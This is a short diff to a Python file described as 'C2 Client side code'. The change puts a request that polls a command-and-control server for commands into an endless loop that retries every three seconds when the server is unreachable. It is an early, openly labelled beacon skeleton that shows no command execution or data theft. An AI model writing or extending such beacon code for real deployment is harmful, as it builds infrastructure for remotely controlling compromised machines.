@@ -4,7 +4,7 @@
 C2 Client side code
 """
 import platform, socket, time
-from requests import get
+from requests import exceptions, get
 from os import getenv, uname
 
 
@@ -28,8 +28,12 @@ HEADER: dict[str, str] = {
 }
 
 # PROXY = {"https": "proxy.some-site.com:443"}
-
-x = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)
-
-print(f"Response Object: {x.request.headers}\n\tHeader: {x.headers}\n\tReason: {x.reason}\n\tStatus: {x.status_code}")
+while True:
+    try:
+        cmd = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)
+        print(f"Response Object: {cmd.request.headers}\n\tHeader: {cmd.headers}\n\tReason: {cmd.reason}\n\tStatus: {cmd.status_code}")
+    except exceptions.RequestException as e:
+        print(f"Server down - error: {e}")
+        time.sleep(3)
+        continue
 
